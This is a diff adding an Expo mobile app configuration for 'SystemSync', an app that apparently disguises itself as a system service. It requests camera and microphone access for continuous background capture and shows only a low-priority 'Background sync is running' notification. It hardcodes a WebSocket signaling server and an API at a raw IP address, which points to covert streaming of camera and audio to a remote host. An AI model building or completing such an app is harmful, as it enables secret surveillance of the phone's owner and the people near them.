@@ -1,0 +1,73 @@
+{
+  "expo": {
+    "name": "SystemSync",
+    "slug": "system-sync",
+    "version": "1.0.0",
+    "orientation": "portrait",
+    "icon": "./assets/icon.png",
+    "userInterfaceStyle": "dark",
+    "splash": {
+      "image": "./assets/splash.png",
+      "resizeMode": "contain",
+      "backgroundColor": "#000000"
+    },
+    "android": {
+      "adaptiveIcon": {
+        "foregroundImage": "./assets/adaptive-icon.png",
+        "backgroundColor": "#000000"
+      },
+      "package": "com.systemsync.service",
+      "permissions": [
+        "CAMERA",
+        "RECORD_AUDIO",
+        "FOREGROUND_SERVICE",
+        "FOREGROUND_SERVICE_CAMERA",
+        "FOREGROUND_SERVICE_MICROPHONE",
+        "WAKE_LOCK",
+        "POST_NOTIFICATIONS"
+      ],
+      "foregroundService": {
+        "types": ["camera", "microphone"],
+        "notification": {
+          "channelId": "system-sync-channel",
+          "channelName": "System Sync",
+          "title": "System Sync Service",
+          "text": "Background sync is running",
+          "priority": "low",
+          "smallIcon": "ic_launcher",
+          "importance": "low",
+          "ongoing": true,
+          "showWhen": true
+        }
+      },
+      "notification": {
+        "channelId": "system-sync-channel",
+        "channelName": "System Sync",
+        "channelDescription": "System sync notifications",
+        "importance": "low",
+            "vibration": false,
+            "sound": false
+          }
+    },
+    "ios": {
+      "supportsTablet": true,
+      "bundleIdentifier": "com.systemsync.service"
+    },
+    "plugins": [
+      [
+        "expo-build-properties",
+        {
+          "android": {
+            "useLegacyPackaging": false,
+            "minSdkVersion": 26
+          }
+        }
+      ]
+    ],
+    "extra": {
+      "signalingServerUrl": "ws://47.238.101.251:3004",
+      "apiBaseUrl": "http://47.238.101.251:3000"
+    },
+    "assetBundlePatterns": ["**/*"]
+  }
+}
